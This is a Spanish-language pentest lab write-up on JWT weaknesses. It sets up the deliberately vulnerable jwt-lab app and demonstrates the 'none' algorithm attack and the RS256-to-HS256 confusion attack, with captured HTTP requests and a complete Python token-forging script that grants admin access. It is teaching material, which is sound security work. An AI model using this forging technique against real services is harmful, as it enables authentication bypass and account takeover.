# JWT Pentest 101

Recientemente en un pentest me toco poner a prueba el estándar JWT, comúnmente utilizado para codificar cadenas te texto plano a base64, el mismo continentemente tres partes que son las codificadas, separadas por un punto  por ejemplo:

`eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJxc2giOiJjYzczNjQ0YTcwMTJlYWIyYjgzZTEwNWZmZDVjZWJmY2VmMzYwNGFlMTlkNDI0M2I4MTUwOWMzOGM4MzA0YzU2IiwiaXNzIjoic2VydmljZWRlc2stand0LXRva2VuLWlzc3VlciIsImNvbnRleHQiOnsidXNlciI6IjEyMDc1IiwiZXhwaXJ5IjoiMTYwOTk2NTQ4NyIsInBvcnRhbElkIjoiNSJ9LCJleHAiOjE2MjQ5MTI2ODcsImlhdCI6MTYwOTM2MDY4N30.FK54Jk4nSk-ZGz-UUCJjt4eTM3FYgOFRJ4fj04SkHKk`

Y para decodificarlo se pueden usar herramientas online como https://jwt.io/

![1](img/1.png)

Las tres partes que lo componen son:

* Header es donde encontramos el algoritmo y el tipo de token.
* Payload encontramos los datos de usuario y privilegios
* Signature donde encontramos la firma que verifica que el token sea valido

![](img/2.png)

**Fuente:** https://research.securitum.com/jwt-json-web-token-security/

No entraremos en muchos detalles pueden visitar en las referencias más afondo sobre [JWT](https://openwebinars.net/blog/que-es-json-web-token-y-como-funciona/) 

#### Problemas JWT

1. Filtrado de información sensitiva: dado que el payload se transmite en base64 pueden ocurrir filtraciones de información confidencial

2. Modificar el algoritmo que comprueba que toke no es modificado por actores de amenaza durante la transmisión. Algunas librerías soportan modificar el algoritmo utilizado a **none**, cuando el algoritmo usan none la verificación de la firma no se da. Luego de cambiar el algoritmo a none, se remueve los dato de la firma de jwt (header + '.' + payload + '.') enviando al servidor.

3. Modifica el algoritmo RS256 a HS256 (Algoritmo de cifrado asimétrico a algoritmo de cifrado simétrico)

   El algoritmo HS256 utiliza la clave secreta para firmar y verificar cada mensaje, mientras algoritmo RS256 usa la clave privada para firmar el mensaje y usa la clave pública para la autenticación.
   Si cambia el algoritmo de RS256 a HS256, el código de backend usa la clave pública como clave secreta y luego usa el algoritmo HS256 para verificar la firma.
   Debido a que el atacante a veces puede obtener la clave pública, el atacante puede modificar el algoritmo en el encabezado a HS256 y luego usar la clave pública RSA para firmar los datos.
   El código de backend utiliza la clave pública RSA + el algoritmo HS256 para la verificación de la firma.

#### Hacking JWT

##### Requisitos:

* Repositorio https://github.com/h-a-c/jwt-lab
* Burp Suite Community
* Burp Suite Extensión https://portswigger.net/bappstore/f923cbf91698420890354c1d8958fee6
* [VPS](https://www.vultr.com/?ref=8403796-6G) 

##### Instalación del lab

Clonamos el repositorio y accedemos al repositorio

```shell
git clone https://github.com/h-a-c/jwt-lab
```

![3](img/3.png)

Instalamos Ruby

```
snap install ruby --classic
```

<img src="img/4.png" alt="4" style="zoom:50%;" />

**Nota:** durante la instalación se presentarán problemas que fueron resueltos siguiendo la siguiente guía https://linuxize.com/post/how-to-install-ruby-on-ubuntu-20-04/

Luego necesitaremos instalar 

`gem install bundler:2.1.4`

```ruby
bundle install
```

<img src="img/5.png" alt="5" style="zoom:50%;" />

```shell
rails db:migrate
```

**Nota2:** deben tener Yarn instalado en ubuntu, si presentan algún problema el siguiente enlace los puede ayudar https://linuxize.com/post/how-to-install-yarn-on-ubuntu-18-04/

![6](img/6.png)

Vamos a iniciar el servidor del laboratorio

`rails s`

<img src="img/7.png" alt="7" style="zoom:50%;" />

Accedemos a la aplicación para ello debemos entrar con un tunel ssh

```
ssh -p 22 -l root -N -L3000:127.0.0.1:3000 207.148.91.57
```

![8](img/8.png)

Como observamos ya tenemos nuestro laboratorio preparado para lograr probar las diversas falles que pueden darse en JWT

#### Ataques a JWT

Debemos tener configurado nuestro proxy en el navegador donde vamos a capturar las peticiones

1. **Algoritmo None**

![9](img/9.png)

Creamos un usuario

![10](img/10.png)

La petición de la creación el usuario podemos observarla 

```curl
POST /users HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: es-AR,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://localhost:3000/users/new
Content-Type: application/x-www-form-urlencoded
Content-Length: 299
Origin: http://localhost:3000
Connection: close
Cookie: _jwt_lab_session=IpbRMjSrFw2D7yECGoTCThFuQSHfjiSpnvHNOvdnmklQfTxckcTT7Rf%2BAOJ3xsFFH03X9XrxE0j9346rurIYCw5oq94pABFzzLk1nM5G%2B6Ay3Y8JZdvaWYPHX1DYzgMi6tYREYBks1nQiuSKIpPzPRxyknnMmakUh5SGZwFCIvb%2Bf0ng6fARybv2LjsC74EqGD9tntyBRuy9G6rsRRuRmr4zBzAMlEA8GL9CRv8K98T7nJlLe%2BdH08XFQcZU9LiPpL291GBdDwayodjAQKGOE33ppYFqgHUP--l8oGVlrnV9Lt2nNW--aRvy0eenF0Uc2CrMObXTQQ%3D%3D
Upgrade-Insecure-Requests: 1

authenticity_token=qGndlApafn1KR%2F4xhCbE9ihbATNrvgAvumt1UtOGmLm2CRU%2FWeqpn9JsJnvefyKkgdgnB6YbRgb2%2FL70j3FRaQ%3D%3D&user%5Bname%5D=jam620&user%5Bemail%5D=prueba%40gmail.com&user%5Bsecret_fact%5D=helado&user%5Bpassword%5D=123456789&user%5Bpassword_confirmation%5D=123456789&commit=Create+my+account
```

Hemos creado el usuario que vamos a usar para realizar el ataque

<img src="img/11.png" alt="11" style="zoom:50%;" />

Luego de foguearnos en el challenges capturamos la petición

```
GET /authentication/none HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: es-AR,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://localhost:3000/authentication/none
Connection: close
Cookie: _jwt_lab_session=uKB366QnpNdMTcrA0a3uSHS1f7DwcUm1pN2wn5IL9rFkBXBtWFetJ9iT11JSq9x4P7avwM1ggJVmecwtZgPXtlfeW4SelsgxnKjh4Z39LqJXaxh9gqmArpsYtWoLikS%2B%2FuN8riGospW%2FdEEBPMYJzEk%2BSwHPrnZtnyFj32Gg%2FrYSRt2B87DLYaYfHpvsqXINe8JCASQKKSu0pS6IYqCfbZRkNczg378i7dXc2Dc9ocA0xXfwMVUD1lkquZHeO%2BMAuaZ1o94EKPseSSVfzJDy2BIMPlv6Co8g--hA96XZNiRCW1W9NI--VYvc2eBLWyczrXLTobOsEA%3D%3D; challenge=eyJhbGciOiJSUzI1NiJ9.eyJuYW1lIjoiamFtNjIwIn0.iwPXa3BXYqWjtCLZT4K4y_vITvEnOcxRmrTiLTDN7voaRZaEf7pv_eiuXW_oimCLXvjDK47rWkyxh1OUGqgNFsc7h33ObmiKJcsWie0Qukg3MFN-js0XYAW-CamIGPl-59spEeHB2WCUCohOfUXpBPX4fReXlmPg6wYJydrgqnyu3EAVtyyrsUu8vLMvQpGahMpBJUAeden9mu0dnUouYcY8R_7u2iYoi-Pg-mA_6XImRzPnTl64SKkRsZ-h7dbKy5jAPeheDgnIHJBHwGbwEno_qXdDhZcAF7wP2G0UtdXZjQau2oiuuQBMOERW7173uku6sbIhn7AhuZG7sk4Y8w
Upgrade-Insecure-Requests: 1

```

Enviamos el **challenges al decoder**

<img src="img/12.png" alt="12" style="zoom:50%;" />

Ahora observamos el contenido con el decoder y observamos el header con el algoritmo RS256

![13](img/13.png)

De igual manera podemos enviar la petición al repeater y observar la extensión de burp suite que mencionamos en los requerimientos

![14](img/14.png)

Cambiamos el algoritmo a None y el usuario a admin

<img src="img/15.png" alt="15" style="zoom:50%;" />

Y procedemos a enviar la petición 

<img src="img/16.png" alt="16" style="zoom:50%;" />

Podemos observar que estamos logrados con el usuario Admin y hemos cambiando el algoritmo a **None**

2. **Cambiar el Algoritmo RS256 a HS256**

Vamos al menu http://localhost:3000/authentication/hmac

<img src="img/17.png" alt="17" style="zoom:50%;" />

Para el ataque vamos a utilizar el siguiente script https://raw.githubusercontent.com/farah-hawa/Jwt-code/master/jwt.py. Esto nos permitirá genera un token para acceder como admin

Procedemos a capturar la petición y enviar al decoder el header para modificar el valor el algoritmo y añadirlo en el script, ya el script cuenta con los parámetros necesarios para generar la firma, solamente debemos crear un archivo public.pem

```python
import hmac
import hashlib
import base64

#Paste the file with the key
file=open('public.pem')

key = file.read()

#Paste your header and payload here
header = '{"alg":"HS256"}'
payload = '{"name":"admin"}'

#Creating encoded header
encodedHBytes = base64.urlsafe_b64encode(header.encode("utf-8"))
encodedHeader = str(encodedHBytes, "utf-8").rstrip("=")

#Creating encoded payload
encodedPBytes = base64.urlsafe_b64encode(payload.encode("utf-8"))
encodedPayload = str(encodedPBytes, "utf-8").rstrip("=")

#Concatenating header and payload
token = (encodedHeader + "." + encodedPayload)

#Creating signature
sig = base64.urlsafe_b64encode(hmac.new(bytes(key, "UTF-8"),token.encode('utf-8'),hashlib.sha256).digest()).decode('UTF-8').rstrip("=")

print(token + "." + sig)
```

![18](img/18.png)

![19](img/19.png)

Hacemos lo mismo para la sección del payload 

![20](img/20.png)

![21](img/21.png)

Vamos a generar una nueva firma utilizando el script

![22](img/22.png)

Y enviamos la petición reemplazando con el valor de la firma generada

```
eyJhbGciOiJIUzI1NiJ9.eyJuYW1lIjoiYWRtaW4ifQ.y65I9S3UiREQPUe0XREshv1sv0vyB0E-kjW_o14gM3s
```

Vamos a modificar la petición añadiendo  el JWT creado

```
GET /authentication/hmac HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: es-AR,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://localhost:3000/challenges
Connection: close
Cookie: _jwt_lab_session=xoaUULZxRGZ0REbZuu%2BInJb9OWdkd%2BxTxtpN7PaDHZrpZ5vKT%2F8RKNjfmYa01m0iVLRmxt1B6wBIZlruoZALDoj01AR9P346036FItXYnSkbcdHRjMWEyhOJ9HSkA0993IzC7xI4miGf2npDgrpS44llXu%2BGtIeQHv23hQSqUQal%2FZQiJr7Lq3P5jC4PMsFiVcAEoh%2BQvkGDeNV%2BfLj8qEeZU8niQC5QmSFBdWu15JxKl2v1v5JlRNBmn01wvjb6H88dooizsg1Uz5%2BDkwlUXKPxlS0XOmOn--xRMLfBu8GbIFqRiw--QLPZyZDB2S0i%2FK1LsUEw9g%3D%3D; challenge=eyJhbGciOiJIUzI1NiJ9.eyJuYW1lIjoiYWRtaW4ifQ.y65I9S3UiREQPUe0XREshv1sv0vyB0E-kjW_o14gM3s
Upgrade-Insecure-Requests: 1
If-None-Match: W/"df0a5a5418b1338dda4d52fb1bb84505"
Cache-Control: max-age=0


```

Enviamos la petición lo que nos debe generar una sesión donde observamos la llave del admin

![23](img/23.png)

Hemos revisado los dos primeros ejemplos de JWT, pero el mismo tiene otras vulnerabilidades que podemos ir probando 

<img src="img/24.png" alt="24" style="zoom:50%;" />



#### Referencias:

* Magaña, L. M. L. (2020, 25 junio). Qué es Json Web Token y cómo funciona. OpenWebinars.net. https://openwebinars.net/blog/que-es-json-web-token-y-como-funciona/
* M. (2019a, noviembre 3). JWT (JSON Web Token) (in)security. research.securitum.com. https://research.securitum.com/jwt-json-web-token-security/
* Attacking JWT authentication. (2016, 28 septiembre). Sjoerd Langkemper. https://www.sjoerdlangkemper.nl/2016/09/28/attacking-jwt-authentication/
* JSON Web Token Validation Bypass in Auth0 Authentication API | Insomnia Security. (s. f.). Insomniasec. Recuperado 7 de marzo de 2021, de https://insomniasec.com/blog/auth0-jwt-validation-bypass
* Rosonke, T. (2020, 7 agosto). JWT Hacking 101. TrustFoundry. https://trustfoundry.net/jwt-hacking-101/
* T. (s. f.-d). ticarpi/jwt_tool. GitHub. Recuperado 7 de marzo de 2021, de https://github.com/ticarpi/jwt_tool/wiki/Attack-Methodology
* Pratap, R. (2020, 27 junio). Hacking JSON Web Token (JWT) - 101-writeups. Medium. https://medium.com/101-writeups/hacking-json-web-token-jwt-233fe6c862e6